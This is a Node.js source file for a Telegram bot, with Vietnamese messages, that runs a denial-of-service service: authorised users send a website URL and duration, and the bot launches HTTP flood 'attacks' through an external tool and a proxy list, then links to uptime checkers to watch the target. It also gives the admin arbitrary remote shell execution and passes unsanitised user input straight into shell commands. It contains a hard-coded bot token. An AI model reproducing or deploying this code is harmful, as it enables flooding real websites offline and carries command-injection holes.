const TelegramBot = require('node-telegram-bot-api'),
    { exec } = require('child_process'),
    token = '7935173392:AAHpUFbBsWM442ux9-rPVkgNKTYv96cm1I0',
    adminId = 7371969470,
    allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]),
    bot = new TelegramBot(token, { polling: true }),
    maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;

let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, botStartTime = Date.now();

const initBot = () => {
    bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 120</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

    bot.on('message', async msg => {
        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg,
            isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;

        if (date * 1000 < botStartTime) return;
        if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: @ghost_reaper_007.', { parse_mode: 'HTML' });
        if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
        if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });

        if (text.startsWith('http')) {
            const [host, time, full] = text.split(' ');
            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
            const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);

            if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
            if (currentProcesses >= maxCurrent) {
                queue.push({ userId, host, time: attackTime, chatId, caller });
                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
            }

            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
            activeAttacks[pid] = { userId, endTime };
            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
            currentProcesses++;

            const methods = full === 'full' ? ['GET', 'POST', 'HEAD'] : ['GET'];
            const startMessage = JSON.stringify({
                Status: "✨🚀🛸 Successfully 🛸🚀✨",
                Caller: caller,
                "PID Attack": pid,
                Website: host,
                Time: `${attackTime} Giây`,
                Maxslot: maxSlot,
                Maxtime: maxTimeAttacks,
                Methods: methods.join(' '),
                ConcurrentAttacks: currentProcesses,
                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
                CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
                HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
            }, null, 2);

            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

            let completedMethods = 0;
            methods.forEach(method => {
                exec(`node --max-old-space-size=8192 ./negan -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                    completedMethods++;
                    if (completedMethods === methods.length) {
                        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
                        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
                        delete activeAttacks[pid];
                        userProcesses[userId]--;
                        currentProcesses--;

                        if (queue.length) {
                            const next = queue.shift();
                            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
                            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
                        }
                    }
                });
            });
            return;
        }

        if (text.startsWith('exe ') && isAdmin) {
            const cmd = text.slice(4);
            if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
            exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
        }
    });
};

initBot();
